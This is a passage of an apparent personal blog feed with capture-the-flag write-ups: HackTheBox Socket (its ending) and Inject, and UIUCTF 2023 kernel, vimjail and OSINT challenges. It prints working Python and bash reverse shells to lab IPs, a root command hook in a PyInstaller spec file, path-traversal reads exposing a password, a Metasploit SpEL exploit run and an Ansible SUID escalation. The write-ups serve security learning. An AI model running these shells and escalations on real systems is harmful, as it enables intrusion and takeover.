Pyinstaller is used to compile easily-launchable binary files from python code. In this situation, pyinstaller is used so that the QReader code, written in python, can exist in a single executable for users to download. Pyinstaller compiling can be well customized through use of .spec files, which it uses to determine how to process your python script. More info can be found [here]](https://pyinstaller.org/en/stable/spec-files.html). Since we are running pyinstaller as root, perhaps we can define in the .spec file for root to do other actions.\nUsing the make script to produce a .spec template For testing around, I used a python rev shell script. The python file\u0026rsquo;s contents shouldn\u0026rsquo;t matter, but I figured why not.\nrev.py:\n1 2 3 4 5 6 7 8 9 import socket import subprocess import os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((\u0026#34;10.10.14.101\u0026#34;,8001)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) import pty; pty.spawn(\u0026#34;sh\u0026#34;) Running make once on this creates a .spec file for us to use and create our own executable:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 tkeller@socket:/tmp/$ sudo /usr/local/sbin/build-installer.sh make rev.py 384 INFO: PyInstaller: 5.6.2 384 INFO: Python: 3.10.6 387 INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35 387 INFO: wrote /tmp/qreader.spec \u0026lt;...SNIP...\u0026gt; tkeller@socket:/tmp/$ cat qreader.spec # -*- mode: python ; coding: utf-8 -*- block_cipher = None a = Analysis( [\u0026#39;rev.py\u0026#39;], pathex=[], binaries=[], datas=[], hiddenimports=[], hookspath=[], hooksconfig={}, runtime_hooks=[], excludes=[], win_no_prefer_redirects=False, win_private_assemblies=False, cipher=block_cipher, noarchive=False, ) pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher) exe = EXE( pyz, a.scripts, a.binaries, a.zipfiles, a.datas, [], name=\u0026#39;qreader\u0026#39;, debug=False, bootloader_ignore_signals=False, strip=False, upx=True, upx_exclude=[], runtime_tmpdir=None, console=True, disable_windowed_traceback=False, argv_emulation=False, target_arch=None, codesign_identity=None, entitlements_file=None, ) Now that we have a proper .spec file, we can begin to make small changes that might allow us to execute actions as root.\nSubprocess execution in pyinstaller .spec file The pyinstaller documents appear to suggest this .spec file can also interpret python code. And so, I make a simple addition to it that will execute a .sh script and, in that script, I provide a simple reverse shell.\nrev.sh:\n1 2 #!/bin/bash bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.101/18 0\u0026gt;\u0026amp;1 At the top of the .spec file I include imports and a popen command:\n1 2 3 4 5 6 7 8 9 10 11 tkeller@socket:/tmp/1$ head qreader.spec # -*- mode: python ; coding: utf-8 -*- block_cipher = None import subprocess subprocess.Popen(\u0026#39;/tmp/rev.sh\u0026#39;, shell=True) a = Analysis( Now upon calling build, pyinstaller should invoke the .spec file and subsequently open my rev.sh as root, giving me an interactive session.\n1 2 3 4 5 6 7 8 9 10 tkeller@socket:/tmp/$ sudo /usr/local/sbin/build-installer.sh build qreader.spec 124 INFO: PyInstaller: 5.6.2 124 INFO: Python: 3.10.6 127 INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35 130 INFO: UPX is not available. 131 INFO: Extending PYTHONPATH with paths [\u0026#39;/tmp/\u0026#39;] \u0026lt;...SNIP...\u0026gt; 8829 INFO: Building EXE from EXE-00.toc completed successfully. tkeller@socket:/tmp$ Meanwhile in another terminal session:\n1 2 3 4 $ nc -nvlp 8001 listening on [any] 8001 ... connect to [10.10.14.101] from (UNKNOWN) [10.10.11.206] 37536 root@socket:/tmp/1# Reflection The difficulty of this box is primarily focused in the WebSocket interaction, true to the box name. The SQLi vulnerability can be easily missed, and without extra help, SQLMap can give a lot of problems as well. As a final hit to those manually exploiting, retrieving the password hash is not enough information to access the box. However, once this challenge is overcome, privilege escalation to root authority is much simpler and flexible. I learned several new things on the box, in particular I appreciate learning about rayhan0x01\u0026rsquo;s solution to using SQLMap for WebSocket tasks.\n","date":"2023-07-15T15:06:40-05:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-socket/Socket_hu849eb59558b706146747b24028bb82f3_354031_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-socket/","title":"HackTheBox - Socket"},{"content":"Initial Enumeration Initial nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # Nmap 7.92 scan initiated Sat Mar 11 16:01:55 2023 as: nmap -sCV -A -oN nmap_initial.txt 10.10.11.204 Nmap scan report for 10.10.11.204 Host is up (0.028s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA) | 256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA) |_ 256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519) 8080/tcp open nagios-nsca Nagios NSCA |_http-title: Home Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Mar 11 16:02:11 2023 -- 1 IP address (1 host up) scanned in 16.07 seconds We see a main page at port 8080 with a few pages immediately accessible: 10.10.11.204:8080/blogs 10.10.11.204:8080/upload 10.10.11.204:8080/register\nRegister is dead:\nBlogs is not very interactive. However, uploads lets us upload image files only.\nIn burp, a little exploration shows we can upload any file that ends in a .jpg or .png or other image extension. Trying to upload rev shell with name shell.php.png result is an image display error:\nAfter trying a few things, looking back in burpsuite or curl we see that our injected code is reflected back to us:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ curl -v http://10.10.11.204:8080/show_image?img=shell.php.png * Trying 10.10.11.204:8080... * Connected to 10.10.11.204 (10.10.11.204) port 8080 (#0) \u0026gt; GET /show_image?img=shell.php.png HTTP/1.1 \u0026gt; Host: 10.10.11.204:8080 \u0026gt; User-Agent: curl/7.88.1 \u0026gt; Accept: */* \u0026gt; \u0026lt; HTTP/1.1 200 \u0026lt; Accept-Ranges: bytes \u0026lt; Content-Type: image/jpeg \u0026lt; Content-Length: 5493 \u0026lt; Date: Tue, 04 Jul 2023 20:24:18 GMT \u0026lt; \u0026lt;?php // php-reverse-shell - A Reverse Shell implementation in PHP // Copyright (C) 2007 pentestmonkey@pentestmonkey.net // // This tool may be used for legal purposes only. Users take full responsibility // for any actions performed using this tool. The author accepts no liability // for damage caused by this tool. If these terms are not acceptable to you, then // do not use this tool. So, the reason it doesn\u0026rsquo;t show in firefox browser is because the header content-type describes image/jpeg, then the data described is plaintext. The browser tries to display an image from the information, which obviously doesn\u0026rsquo;t work.\nThe image url is very interesting, as it might allow for directory traversal, leading to unintended file reads: http://10.129.34.82:8080/show_image?img=shell.php.png. Looking for /etc/passwd:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 $ curl -v http://10.10.11.204:8080/show_image?img=../../../../../../etc/passwd * Trying 10.10.11.204:8080... * Connected to 10.10.11.204 (10.10.11.204) port 8080 (#0) \u0026gt; GET /show_image?img=../../../../../../etc/passwd HTTP/1.1 \u0026gt; Host: 10.10.11.204:8080 \u0026gt; User-Agent: curl/7.88.1 \u0026gt; Accept: */* \u0026gt; \u0026lt; HTTP/1.1 200 \u0026lt; Accept-Ranges: bytes \u0026lt; Content-Type: image/jpeg \u0026lt; Content-Length: 1986 \u0026lt; Date: Tue, 04 Jul 2023 20:28:36 GMT \u0026lt; root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin frank:x:1000:1000:frank:/home/frank:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false sshd:x:113:65534::/run/sshd:/usr/sbin/nologin phil:x:1001:1001::/home/phil:/bin/bash fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin _laurel:x:997:996::/var/log/laurel:/bin/false * Connection #0 to host 10.10.11.204 left intact Foothold Enumeration with arbitrary file reading From here we find two users on the box, frank and Phil.\nUpon further inspection, I learned that the query can actually output the contents of folders, which is unusual for this type of vulnerability. In most cases, if the query is not a file that exists it will return an error.\n1 2 3 4 5 6 7 $ curl http://10.10.11.204:8080/show_image?img=../../../../../../home/frank/ .bash_history .bashrc .cache .local .m2 .profile Hidden folders are shown as well, which may or may not come in handy.\nAfter exploring the contents of Frank\u0026rsquo;s home directory, we find an interesting file in .m2/settings.xml:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ curl http://10.10.11.204:8080/show_image?img=../../../../../../home/frank/.m2/settings.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;settings xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;servers\u0026gt; \u0026lt;server\u0026gt; \u0026lt;id\u0026gt;Inject\u0026lt;/id\u0026gt; \u0026lt;username\u0026gt;phil\u0026lt;/username\u0026gt; \u0026lt;password\u0026gt;DocPhillovestoInject123\u0026lt;/password\u0026gt; \u0026lt;privateKey\u0026gt;${user.home}/.ssh/id_dsa\u0026lt;/privateKey\u0026gt; \u0026lt;filePermissions\u0026gt;660\u0026lt;/filePermissions\u0026gt; \u0026lt;directoryPermissions\u0026gt;660\u0026lt;/directoryPermissions\u0026gt; \u0026lt;configuration\u0026gt;\u0026lt;/configuration\u0026gt; \u0026lt;/server\u0026gt; \u0026lt;/servers\u0026gt; \u0026lt;/settings\u0026gt; We now have login credentials for phil, with password DocPhillovestoInject123.\n1 2 3 4 5 6 7 8 $ ssh phil@10.10.11.204 The authenticity of host \u0026#39;10.10.11.204 (10.10.11.204)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:8MhHRO2LTR9G168dKL9vVmXYYb904O1gv5Eg1Q6njSU. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.11.204\u0026#39; (ED25519) to the list of known hosts. phil@10.10.11.204\u0026#39;s password: Permission denied, please try again. In an unexpected twist, the password doesn\u0026rsquo;t seem to work for phil or for frank. Examining /etc/ssh/sshd_config, i see this:\n1 2 3 4 5 6 7 8 9 10 # Authentication: DenyUsers phil #LoginGraceTime 2m #PermitRootLogin prohibit-password #StrictModes yes #MaxAuthTries 6 #MaxSessions 10 #PubkeyAuthentication yes Perhaps the password for phil is correct, but ssh authentication is locked for him? Perhaps we will revisit this once we have access through a different avenue.\nLeveraging CVE 2022-22963 Exploring the source code documents with the file read exploit:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 $ curl http://10.10.11.204:8080/show_image?img=../../../../../../var/www/WebApp/pom.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;parent\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-parent\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.6.5\u0026lt;/version\u0026gt; \u0026lt;relativePath/\u0026gt; \u0026lt;!-- lookup parent from repository --\u0026gt; \u0026lt;/parent\u0026gt; \u0026lt;groupId\u0026gt;com.example\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;WebApp\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;0.0.1-SNAPSHOT\u0026lt;/version\u0026gt; \u0026lt;name\u0026gt;WebApp\u0026lt;/name\u0026gt; \u0026lt;description\u0026gt;Demo project for Spring Boot\u0026lt;/description\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;java.version\u0026gt;11\u0026lt;/java.version\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.sun.activation\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javax.activation\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-thymeleaf\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-devtools\u0026lt;/artifactId\u0026gt; \u0026lt;scope\u0026gt;runtime\u0026lt;/scope\u0026gt; \u0026lt;optional\u0026gt;true\u0026lt;/optional\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-function-web\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-test\u0026lt;/artifactId\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.webjars\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;bootstrap\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.1.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.webjars\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;webjars-locator-core\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;build\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-maven-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${parent.version}\u0026lt;/version\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;finalName\u0026gt;spring-webapp\u0026lt;/finalName\u0026gt; \u0026lt;/build\u0026gt; \u0026lt;/project\u0026gt; Here we can see the dependencies this webapp is built on. After exploring some potential vulnerabilities from the plugins listed, I eventually find a relevant exploit in spring boot cloud Using metasploit module to exploit:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 msf6 \u0026gt; search spring cloud Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/http/springcloud_directory_traversal 2020-06-01 normal No Directory Traversal in Spring Cloud Config Server 1 auxiliary/scanner/http/springcloud_traversal 2019-04-17 normal No Spring Cloud Config Server Directory Traversal 2 exploit/multi/http/spring_cloud_function_spel_injection 2022-03-29 excellent Yes Spring Cloud Function SpEL Injection 3 exploit/linux/http/spring_cloud_gateway_rce 2022-01-26 excellent Yes Spring Cloud Gateway Remote Code Execution Interact with a module by name or index. For example info 3, use 3 or use exploit/linux/http/spring_cloud_gateway_rce msf6 \u0026gt; use 2 [*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp msf6 exploit(multi/http/spring_cloud_function_spel_injection) \u0026gt; For this exploit we only need to set our attacker host as LHOST and the target host as RHOST. The default port, 8080, is conveniently the port used on this inject box.\nAfter setting options in msfconsole, we get a shell as user frank.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 msf6 exploit(multi/http/spring_cloud_function_spel_injection) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.167:4444 [*] Running automatic check (\u0026#34;set AutoCheck false\u0026#34; to disable) [!] The service is running, but could not be validated. [*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp [*] Sending stage (3045348 bytes) to 10.10.11.204 [*] Command Stager progress - 100.00% done (823/823 bytes) [*] Meterpreter session 1 opened (10.10.14.167:4444 -\u0026gt; 10.10.11.204:33702) at 2023-07-04 17:01:12 -0400 meterpreter \u0026gt; shell Process 57134 created. Channel 1 created. whoami frank Now that we are in, we can try phil\u0026rsquo;s password again:\n1 2 3 4 su phil Password: DocPhillovestoInject123 whoami phil From here we can grab user.txt in phil\u0026rsquo;s home directory.\nPrivilege Escalation Enumeration Checking phil\u0026rsquo;s id, we see he is in multiple groups:\n1 2 id uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff) Looking for things owned by this group:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 find / -group \u0026#34;staff\u0026#34; 2\u0026gt;/dev/null /opt/automation/tasks /root /var/local /usr/local/lib/python3.8 /usr/local/lib/python3.8/dist-packages /usr/local/lib/python3.8/dist-packages/ansible_parallel.py /usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info /usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/LICENSE /usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/RECORD /usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/entry_points.txt /usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/WHEEL /usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/METADATA /usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/top_level.txt /usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/INSTALLER /usr/local/lib/python3.8/dist-packages/__pycache__ /usr/local/lib/python3.8/dist-packages/__pycache__/ansible_parallel.cpython-38.pyc /usr/local/share/fonts /usr/local/share/fonts/.uuid It is strange to see the /root/ folder owned by staff. There is another folder owned by staff under /opt/autmoation/.\n1 2 3 4 5 ls -al /opt/automation/ total 12 drwxr-xr-x 3 root root 4096 Oct 20 2022 . drwxr-xr-x 3 root root 4096 Oct 20 2022 .. drwxrwxr-x 2 root staff 4096 Jul 4 21:16 tasks We can see the folder is group writable, and automation suggests these might be tasks automatically run by a user, perhaps root?\nBecoming root 1 2 3 4 5 6 7 8 9 10 ls playbook_1.yml cat playbook_1.yml - hosts: localhost tasks: - name: Checking webapp service ansible.builtin.systemd: name: webapp enabled: yes state: started We can see this is an ansible playbook, and ansible themselves have documentations on how one might elevate privileges for their playbooks. We might be able to invoke ansible as root, allowing us to execute any command specified in an ansible playbook. Rewriting the playbook contents, I have it designed to add SUID privileges to /bin/bash, allowing us to run a bash shell as root:\n1 2 3 4 5 - hosts: localhost tasks: - name: PrivEsc ansible.builtin.shell: cmd: \u0026#34;chmod u+s /bin/bash\u0026#34; After a few minutes, we can check the newly changed bash file, and become root:\n1 2 3 4 5 ls -al /bin/bash -rwsr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bash /bin/bash -p whoami root Reflection Overall an interesting box, and an interesting spotlight to the power of ansible. The path to foothold was rather frustrating, the vulnerable plugin spring framework was deeply concealed. I spent a good deal of time exploring other potential vulnerabilities in spring boot that had seemed viable at the time.\n","date":"2023-07-08T09:04:19-05:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-inject/Inject_hu12ac3957f7a126ac06ec9338f7d84355_333068_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-inject/","title":"HackTheBox - Inject"},{"content":"Misc Corny Kernel Use our corny little driver to mess with the Linux kernel at runtime!\nChecking the attached file:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // SPDX-License-Identifier: GPL-2.0-only #define pr_fmt(fmt) KBUILD_MODNAME \u0026#34;: \u0026#34; fmt #include \u0026lt;linux/module.h\u0026gt; #include \u0026lt;linux/init.h\u0026gt; #include \u0026lt;linux/kernel.h\u0026gt; extern const char *flag1, *flag2; static int __init pwny_init(void) { pr_alert(\u0026#34;%s\\n\u0026#34;, flag1); return 0; } static void __exit pwny_exit(void) { pr_info(\u0026#34;%s\\n\u0026#34;, flag2); } module_init(pwny_init); module_exit(pwny_exit); MODULE_AUTHOR(\u0026#34;Nitya\u0026#34;); MODULE_DESCRIPTION(\u0026#34;UIUCTF23\u0026#34;); MODULE_LICENSE(\u0026#34;GPL\u0026#34;); MODULE_VERSION(\u0026#34;0.1\u0026#34;); We can see this module produces two flag parts, flag1 and flag2. One at init and one at exit. Entering the challenge terminal:\n1 2 3 4 5 6 7 8 9 10 11 $ socat file:$(tty),raw,echo=0 tcp:corny-kernel.chal.uiuc.tf:1337 == proof-of-work: disabled == + mount -n -t proc -o nosuid,noexec,nodev proc /proc/ + mkdir -p /dev /sys /etc + mount -n -t devtmpfs -o \u0026#39;mode=0755,nosuid,noexec\u0026#39; devtmpfs /dev + mount -n -t sysfs -o nosuid,noexec,nodev sys /sys + cd /root + exec setsid cttyhack ash -l /root # ls pwnymodule.ko.gz /root # We find a gzip file in cwd. Interestingly, file is not on this system but it is an irrelevant check. When we unzip we are left with .ko file, which is a kernel object. We can interact with this using modprobe or insmod.\n1 2 3 4 /root # insmod pwnymodule.ko [ 10.571676] pwnymodule: uiuctf{m4ster_ /root # rmmod pwnymodule.ko /root # Upon installing the module we see the first half of the flag. This makes sense considering module_init will produce the flag1 according to our source code. I thought that using rmmod to uninstall would produce the second half of the flag, but it did not go to terminal output.\nEventually I think to check dmesg:\n1 2 3 4 /root # dmesg \u0026lt;...SNIP...\u0026gt; [ 10.571676] pwnymodule: uiuctf{m4ster_ [ 112.877984] pwnymodule: k3rNE1_haCk3r} The difference seems to be primarily in that flag1 is produced with pr_alert() while flag2 is produced with pr_info(). Alert goes to stdout, while info goes to logs, perhaps?\nuiuctf{m4ster_k3rNE1_haCk3r}\nvimjail1 Connect with socat file:$(tty),raw,echo=0 tcp:vimjail1.chal.uiuc.tf:1337. You may need to install socat\nChecking the vimrc:\n1 2 3 4 5 6 7 8 $ cat vimrc set nocompatible set insertmode inoremap \u0026lt;c-o\u0026gt; nope inoremap \u0026lt;c-l\u0026gt; nope inoremap \u0026lt;c-z\u0026gt; nope inoremap \u0026lt;c-\\\u0026gt;\u0026lt;c-n\u0026gt; nope we can see the default is set to insert mode over normal mode. Additionally, several common escape keystrokes have been remapped to \u0026ldquo;nope\u0026rdquo;. However, looking carefully shows a small mistake. \u0026lt;c-\\\u0026gt;\u0026lt;c-n\u0026gt; has been mapped to \u0026ldquo;nope\u0026rdquo;, but these keystrokes individually have not. And so, we can still use \u0026lt;c-\\\u0026gt; to escape.\nUsing \u0026lt;c-\\\u0026gt; followed by \u0026lt;c-n\u0026gt;, we see insert mode has changed and we are able to supply : commands. Trying :shell,\n1 Shell commands and some functionality not allowed in rvim It looks like we cannot enter a regular shell being in rvim.. perhaps we can open a file named flag.txt?\n1 uiuctf{n0_3sc4p3_f0r_y0u_8613a322d0eb0628} It is worth noting that if you input \u0026lt;c-\\\u0026gt; followed by \u0026lt;c-n\u0026gt; too quickly, then you still get an error. There must be a somewhat large delay for this to work.\nvimjail2 Connect with socat file:$(tty),raw,echo=0 tcp:vimjail2.chal.uiuc.tf:1337. You may need to install socat\nChecking the vimrc, we see the same remaps as vimjail1. Plus some additional remaps:\n1 2 3 4 5 6 7 cnoremap a _ cnoremap b _ cnoremap c _ cnoremap d _ cnoremap e _ cnoremap f _ cnoremap g _ and so on. All special characters and lowercase letters are substituted with _, with the exception of lowercase q. When we enter normal mode through the same method as vimjail1, we find that we are unable to input any commands. However, exiting with :q produces the flag:\n1 2 3 E137: Viminfo file is not writable: /home/user/viminfo Press ENTER or type command to continue uiuctf{\u0026lt;left\u0026gt;\u0026lt;left\u0026gt;\u0026lt;left\u0026gt;\u0026lt;left\u0026gt;_c364201e0d86171b} It feels unintended, and based on the flag name, it looks like the intended solution involved sifting through something using left arrow keystrokes.\nOSINT The OSINT challenges involved a series of exercises related to one another. Though I did not personally solve all of them myself I will cover the related challenges solved by teammates as well.\nWhat\u0026rsquo;s for Dinner? Jonah Explorer, world renowned, recently landed in the city of Chicago, so you fly there to try and catch him. He was spotted at a joyful Italian restaurant in West Loop. You miss him narrowly but find out that he uses a well known social network and and loves documenting his travels and reviewing his food. Find his online profile.\nWith this prompt, we are informed of Jonah enjoying an italian dinner within a small subsection of Chicago. Given this information, I began sifting through all italian restaurants within that zone looking for a recent review or posting by our Jonah. After searching for hours, my fellow colleague managed to find a twitter account belonging to him. Surprisingly enough, Jonah had zero tweets announcing his dinner or even mentioning the place in Chicago. I still don\u0026rsquo;t know where he ate. His only tweet is one containing the flag. uiuctf{i_like_spaghetti}\nFinding Jonah? Jonah offered a reward to whoever can find out what hotel he is staying in. Based on the past information (chals), can you find out what the hotel he stayed at was? Flag should be uiuctf{hotel_name_inn}\nProvided image:\nWe can see two rather tall buildings, with the left one having more identifiable features in a curved top shape. Perusing the tallest buildings in chicago we can identify it fairly quickly as River Point, located at 444 West Lake Street. We know we are looking at a hotel, so from here we can try to guess the hotel location based on the angle of the building, and the relative sizes of the nearby buildings. Eventually we land on a successful guess of uiuctf{hampton_inn}. The inn can be found at this location\nJonah\u0026rsquo;s Journal After dinner, Jonah took notes into an online notebook and pushed his changes there. His usernames have been relatively consistent but what country is he going to next? Flag should be in format uiuctf{country_name}\nThis challenge is dependent on solving What's For Dinner?, as this one contains the key info of account username. There are several online notetaking services, but the language here is a strong suggestion on where it might be. It states that jonah \u0026ldquo;pushed his changes there\u0026rdquo;. The reference here is likely to a git push, which is the method to submit changes on git based services such as github. Searching here we can see right away, https://github.com/jonahexplorer. There is exactly 1 public repo on this account, and in it he states the following:\n1 2 3 storing all my adventure codes I think that the next place I wanna visit is the great wall of china, but not until I get off of flight UA5040 And so, we have our answer. uiuctf{china}.\nFirst class mail Jonah posted a picture online with random things on a table. Can you find out what zip code he is located in? Flag format should be uiuctf{zipcode}, ex: uiuctf{12345}.\nProvided image:\nThe image contains a lot of items, but only a couple stand out as interesting. The first being an insurance letter with the return address in plain sight. Trying uiuctf{16530} did not pass, so this address is not it. The other letter, however, has the mail address hidden but the mail barcode is shown in plain sight. Intelligent Mail Barcodes are used by the USPS to sort mail delivery quickly and easily. If we can decode 